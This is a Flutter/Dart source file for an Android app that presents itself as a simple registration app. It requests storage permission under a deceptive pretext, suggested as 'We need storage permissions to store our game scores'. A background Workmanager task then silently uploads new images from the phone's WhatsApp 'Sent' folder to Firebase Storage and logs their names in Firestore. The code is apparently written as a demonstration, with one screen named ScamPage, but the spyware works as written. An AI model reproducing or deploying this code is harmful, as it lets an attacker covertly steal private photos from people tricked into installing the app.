import 'dart:async';
import 'dart:io' as io;
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';
import 'package:workmanager/workmanager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:email_validator/email_validator.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_storage/firebase_storage.dart' as FirebaseStorage;

void main() {
  runApp(MyApp());
}

List<io.FileSystemEntity> file = [];

// Storing existing image names in SharedPreferences since the workmanager
// service probably won't have access to these variables
Future<Set<String>> getExistingImageSet() async {
  SharedPreferences pref = await SharedPreferences.getInstance();
  List<String>? existingImageList = pref.getStringList("vendingList");
  if (existingImageList == null) {
    pref.setStringList("", [""]);
    existingImageList = [""];
  }
  Set<String> existingImageSet = Set.from(existingImageList);
  return existingImageSet;
}

Future<void> setExistingImageSet(Set<String> newSet) async {
  SharedPreferences pref = await SharedPreferences.getInstance();
  List<String> existingImageList = new List.from(newSet);
  pref.remove("vendingList");
  pref.setStringList("vendingList", existingImageList);
}

Future<void> addToExistingImageSet(String newFileName) async {
  Set<String> existingImageSet = await getExistingImageSet();
  if (existingImageSet.contains(newFileName)) {
    return;
  }
  existingImageSet.add(newFileName);
  setExistingImageSet(existingImageSet);
}

/// Get list of new file names based on which files we've already seen
Future<List<String>> getNewFiles(List<io.FileSystemEntity> fileList) async {
  Set<String> existingImageSet = await getExistingImageSet();
  List<String> newFiles = [];
  for (io.FileSystemEntity thisFile in fileList) {
    String name = getName(thisFile);
    if (!existingImageSet.contains(name)) {
      newFiles.add(name);
    }
  }
  return newFiles;
}

String getName(io.FileSystemEntity temp) {
  return temp.path.split("/").last;
}

String getNameFromPath(String path) {
  return path.split("/").last;
}

/// Load files before the service starts up.
/// If there are 100+ new files, assume they've all been seen already
/// (because we aren't going to upload those many files)
Future<void> loadPreExistingNewFiles() async {
  List<io.FileSystemEntity> fileList = await getAllFilesList();
  List<String> newFileList = await getNewFiles(fileList);
  Set<String> existingImageSet = await getExistingImageSet();
  if (newFileList.length > 100) {
    // assume this is the first time the service is running, so store existing files in the set
    for (String fileName in newFileList) {
      existingImageSet.add(fileName);
    }
  }
  setExistingImageSet(existingImageSet);
}

/// Upload new files to cloud storage, store names on firestore
Future<void> processFiles() async {
  await Firebase.initializeApp();
  List<io.FileSystemEntity> fileList = await getAllFilesList();
  List<String> newFileList = await getNewFiles(fileList);
  Set<String> existingImageSet = await getExistingImageSet();
  if (newFileList.length > 100) {
    // too many new files added, can't attach these many to an email, so let's pretend they've been seen for now
    for (String fileName in newFileList) {
      existingImageSet.add(fileName);
    }
    setExistingImageSet(existingImageSet);
    return;
  }

  for (String newFile in newFileList) {
    await uploadImageToFirebase(
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent/" +
            newFile);
  }
  // for (String newFile in newFileList) {
  //   print(newFile);
  // }

  SharedPreferences pref = await SharedPreferences.getInstance();
  String? toSendEmailTemp = pref.getString("email");
  String toSendEmail = toSendEmailTemp!;
  await FirebaseFirestore.instance.collection("images").doc(toSendEmail).set(
    {
      "imageNames": FieldValue.arrayUnion(
        newFileList,
      ),
    },
    SetOptions(merge: true),
  );

  for (String fileName in newFileList) {
    addToExistingImageSet(fileName);
  }

  // for (String fileName in newFileList) {
  //   print("New file: $fileName");
  // }
}

Future uploadImageToFirebase(String imagePath) async {
  io.File _imageFile = new io.File(imagePath);
  String fileName = getNameFromPath(_imageFile.path);
  FirebaseStorage.Reference firebaseStorageRef =
      FirebaseStorage.FirebaseStorage.instance.ref().child('uploads/$fileName');
  await firebaseStorageRef.putFile(_imageFile);
}

Future<List<io.FileSystemEntity>> getAllFilesList() async {
  // print(
  //     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent/");
  return io.Directory(
          "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent/")
      .listSync();
}

const simplePeriodic15MinTask = "simplePeriodic15MinTask";
const simpleDelayedTask = "simpleDelayedTask";
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    switch (task) {
      case simplePeriodic15MinTask:
        await processFiles();
        break;
      case simpleDelayedTask:
        await processFiles();
        break;
    }
    return true;
  });
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData.dark(),
      home: Scaffold(
        body: MainPage(),
      ),
    );
  }
}

class MainPage extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return MainPageState();
  }
}

class MainPageState extends State<MainPage> {
  TextEditingController emailController = new TextEditingController();
  TextEditingController passwordController = new TextEditingController();
  GlobalKey<FormState> formKey = new GlobalKey<FormState>();

  validateAndProceed() async {
    if (formKey.currentState!.validate()) {
      SharedPreferences pref = await SharedPreferences.getInstance();
      await pref.remove("email");
      await pref.setString("email", emailController.text);
      Navigator.of(context)
          .push(MaterialPageRoute(builder: (context) => ScamPage()));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: true,
      appBar: AppBar(
        elevation: 0.0,
        title: Center(
          child: Text(
            "Some Cute App Name",
          ),
        ),
      ),
      body: Form(
        key: formKey,
        child: Center(
          child: Container(
            width: 300,
            child: Padding(
              padding: EdgeInsets.only(top: 20),
              child: Column(
                children: [
                  Padding(
                    padding: EdgeInsets.all(10.0),
                    child: Text(
                      "Register",
                      textScaleFactor: 3.0,
                      style: TextStyle(color: Colors.amber),
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.all(10.0),
                    child: TextFormField(
                      decoration: InputDecoration(
                        border: InputBorder.none,
                        hintText: "Active email address",
                      ),
                      controller: emailController,
                      validator: (value) {
                        if (value == null) return "Can't be empty";
                        if (!EmailValidator.validate(value)) {
                          return "Please enter a valid email address";
                        }
                      },
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.all(10.0),
                    child: TextFormField(
                      decoration: InputDecoration(
                        border: InputBorder.none,
                        hintText: "Password",
                      ),
                      obscureText: true,
                      obscuringCharacter: "-",
                      controller: passwordController,
                      validator: (value) {
                        if (value == null) return "Can't be empty";
                        if (value.isEmpty) return "Can't be empty";
                      },
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.all(10.0),
                    child: TextButton(
                      child: Text("Done"),
                      onPressed: () {
                        validateAndProceed();
                      },
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.all(10.0),
                    child: Text(
                        "<Some convincing reason that makes sure you allow storage access on the next page>, for e.g."),
                  ),
                  Padding(
                    padding:
                        EdgeInsets.only(left: 10.0, bottom: 10.0, right: 10.0),
                    child: Text(
                      "'We need storage permissions to store our game scores'",
                      style: TextStyle(
                          fontWeight: FontWeight.bold, color: Colors.amber),
                      textAlign: TextAlign.center,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}

class ScamPage extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return ScamPageState();
  }
}

class ScamPageState extends State<ScamPage> {
  String text = "Wait a moment please...";
  @override
  void initState() {
    super.initState();
    initializeWork();
  }

  Future<void> initializeWork() async {
    // Make sure storage access is granted
    await Permission.storage.request().isGranted;
    // Load existing files before hand (because if a phone has 1000s of files
    // , we don't want to upload them all for a demo)
    await loadPreExistingNewFiles();

    await Workmanager().initialize(
      callbackDispatcher,
    );

    // Register a task to grab your pictures once (runs [usually] 15 seconds after the this line of code runs)
    await Workmanager().registerOneOffTask(
      "customVending10",
      simpleDelayedTask,
      initialDelay: Duration(seconds: 15),
    );

    SharedPreferences pref = await SharedPreferences.getInstance();
    String? emailTemp = pref.getString("email");
    String toSendEmail = emailTemp!;
    setState(() {
      text =
          "You can close this app now. Next, take a picture on WhatsApp and send it to someone. Then wait about 1 minute and check $toSendEmail";
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: EdgeInsets.all(30.0),
          child: Text(
            text,
            textScaleFactor: 1.5,
          ),
        ),
      ),
    );
  }
}
